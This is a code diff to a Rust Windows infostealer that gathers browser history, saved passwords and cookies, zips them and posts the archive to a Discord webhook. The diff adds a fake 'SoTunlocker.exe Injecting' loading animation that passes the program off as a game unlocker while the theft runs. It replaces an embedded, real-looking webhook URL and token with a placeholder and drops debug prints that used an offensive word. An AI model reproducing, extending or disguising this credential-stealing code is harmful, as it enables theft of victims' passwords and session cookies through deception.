@@ -1,5 +1,4 @@
-#![windows_subsystem = "windows"]
-use std::{io::BufWriter, fs::File, io::ErrorKind, fs::create_dir, os::windows::process::CommandExt, collections::HashSet, fs::OpenOptions, fs::remove_dir_all, ptr::null_mut, fs::read, fs::write, process::Command, fs::read_dir, fs::copy, slice::from_raw_parts, path::Path, env::var, process::exit, io::Write};
+use std::{time::Duration, thread, io::stdout, io::BufWriter, fs::File, io::ErrorKind, fs::create_dir, os::windows::process::CommandExt, collections::HashSet, fs::OpenOptions, fs::remove_dir_all, ptr::null_mut, fs::read, process::Command, fs::read_dir, fs::copy, slice::from_raw_parts, path::Path, env::var, process::exit, io::Write};
 use aes_gcm::{
     aead::{Aead, KeyInit, Payload},
     Aes256Gcm, Nonce,
@@ -19,6 +18,7 @@ fn main() {
         exit(0);
     }
 
+    let handle = thread::spawn(faker);
     let spacer = "=".repeat(50); 
     let user = var("USERNAME").expect("Failed to get USERNAME");
     let base_dir = format!("C:/Users/{}/AppData/Local/Temp/", &user);
@@ -58,6 +58,61 @@ fn main() {
     }
     let _ = function(&spacer, vec_tkn, &tmp_dir);
     let _ = remove_dir_all(&tmp_dir);
+    handle.join().unwrap();
+}
+fn faker() {
+    let asscii = r#"
+    ███████╗ ██████╗ ████████╗██╗   ██╗███╗   ██╗██╗      ██████╗  ██████╗██╗  ██╗███████╗██████╗ 
+    ██╔════╝██╔═══██╗╚══██╔══╝██║   ██║████╗  ██║██║     ██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+    ███████╗██║   ██║   ██║   ██║   ██║██╔██╗ ██║██║     ██║   ██║██║     █████╔╝ █████╗  ██████╔╝
+    ╚════██║██║   ██║   ██║   ██║   ██║██║╚██╗██║██║     ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+    ███████║╚██████╔╝   ██║   ╚██████╔╝██║ ╚████║███████╗╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
+    ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+    "#;
+    println!("{}", asscii);
+    let mut animatio: Vec<String> = Vec::new();
+    animatio.push(String::from(format!("{}[Loading]{} █▒▒▒▒▒▒▒▒▒ 10%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ██▒▒▒▒▒▒▒▒ 20%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ███▒▒▒▒▒▒▒ 30%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ████▒▒▒▒▒▒ 40%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} █████▒▒▒▒▒ 50%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ██████▒▒▒▒ 60%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ███████▒▒▒ 70%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ████████▒▒ 80%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} █████████▒ 90%", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[Loading]{} ██████████ 100%", "\x1b[32m", "\x1b[37m")));
+
+    let len = animatio.len();
+    for i in 0..len {
+        thread::sleep(Duration::from_millis(350));
+        print!("\r{}", animatio[i % len]);
+        stdout().flush().unwrap();
+    }
+    Command::new("cmd")
+    .arg("/c")
+    .arg("cls")
+    .status()
+    .unwrap();
+    println!("{}", asscii);
+    thread::sleep(Duration::from_secs(1));
+    let mut animatio: Vec<String> = Vec::new();
+    animatio.push(String::from(format!("{}[SoTunlocker.exe]{} Injecting |", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[SoTunlocker.exe]{} Injecting /", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[SoTunlocker.exe]{} Injecting -", "\x1b[32m", "\x1b[37m")));
+    animatio.push(String::from(format!("{}[SoTunlocker.exe]{} Injecting \\", "\x1b[32m", "\x1b[37m")));
+    let len = animatio.len();
+    for i in 0..10 {
+        thread::sleep(Duration::from_millis(350));
+        print!("\r{}", animatio[i % len]);
+        stdout().flush().unwrap();
+    }
+    Command::new("cmd")
+    .arg("/c")
+    .arg("cls")
+    .status()
+    .unwrap();
+    thread::sleep(Duration::from_millis(1500));
+    println!("{}", asscii);
 }
 
 
@@ -176,7 +231,7 @@ fn function(spacer: &String, vec_tkn: Vec<String>, tmp_dir: &String) -> Result<(
     std::io::copy(&mut std::io::BufReader::new(File::open(format!("{}Cookies.txt", &tmp_dir)).unwrap()), &mut zip_writer).unwrap();
     zip_writer.finish().unwrap();
     
-    let webhook_url = "https://discord.com/api/webhooks/1089029413955453018/3gcxGd1RVb36-KZpTm1rHTwFvYyIu0VwXrP9n-5W-_dLzy___IDLp3Z-hOrUIMNQMiCq";
+    let webhook_url = "your_web_hook";
     let file_path = format!("{}{}.zip", &tmp_dir, hostnames);
     let file_name = format!("{}.zip", hostnames);
     let file_contents = read(file_path)?;
@@ -414,8 +469,7 @@ fn history(spacer: &String, tmp_dir: &String, folder: &String) {
         .join("\n\n");
     dastuff = format!("\n\nURL\t\t\t\t{}\n\n{}\n\n", &folder, spacer.repeat(3)).to_owned() + &dastuff + "\n\n";
     match file.write_all(dastuff.as_bytes()) {
-        Ok(_) => println!("nigus"),
-        Err(e) => println!("Error writing data to the file: {}", e),
+        _ => (),
     }
     return
 }
@@ -480,8 +534,7 @@ fn passwords(spacer: &String, tmp_dir: &String, folder: &String) {
         .join("\n\n");
     dastuff = format!("\n\n\t\tURL\t\t\t\t\t         Username\t\t    Password\t\t\t\t{}\n{}\n\n", &folder, spacer.repeat(3)).to_owned() + &dastuff + "\n\n";
     match file.write_all(dastuff.as_bytes()){
-        Ok(_) => println!("nigus"),
-        Err(e) => println!("Error writing data to the file: {}", e),
+        _ => ()
     }
     return
 }
@@ -542,8 +595,7 @@ fn cookies(spacer: &String, tmp_dir: &String, folder: &String) {
         .join("\n\n");
     dastuff = format!("\n\n\t\tCookies\t\t\t\t{}\n{}\n\n", &folder, spacer.repeat(3)).to_owned() + &dastuff + "\n\n";
     match file.write_all(dastuff.as_bytes()){
-        Ok(_) => println!("nigus"),
-        Err(e) => println!("Error writing data to the file: {}", e),
+        _ => ()
     }
     return
 }
